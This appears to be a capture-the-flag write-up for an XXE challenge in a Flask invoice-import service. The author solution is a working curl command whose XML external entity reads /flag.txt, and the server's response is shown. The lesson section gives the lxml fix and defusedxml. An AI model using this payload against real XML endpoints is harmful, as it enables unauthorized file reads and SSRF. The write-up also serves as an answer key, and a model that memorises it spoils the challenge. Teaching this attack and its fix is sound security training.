# XXE — InvoiceLab

A Flask service that ingests B2B invoices as XML and returns a
parsed summary. The lxml parser is configured with
`resolve_entities=True` and `load_dtd=True` — classic XXE.

## Player target

Exfiltrate `/flag.txt` via an XML external entity.

## Author solution

```bash
curl -s http://target:5000/invoices/import \
  -H 'content-type: application/xml' \
  --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<invoice>
  <vendor>&xxe;</vendor>
  <amount>0</amount>
  <note>pwn</note>
</invoice>
XML
```

Response:
```json
{"vendor": "CTF{REDACTED}\n", "amount": "0", "note": "pwn"}
```

## Why this is the lesson

`lxml`'s default `XMLParser()` resolves entities. If you don't
explicitly disable DTD/external-entity loading (or, better, use
`defusedxml`), every XML endpoint is a file-read primitive that
upgrades into SSRF once internal HTTP entities are added.

Safe form:
```python
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)
```
or, the boring-correct choice:
```python
from defusedxml.lxml import fromstring
```
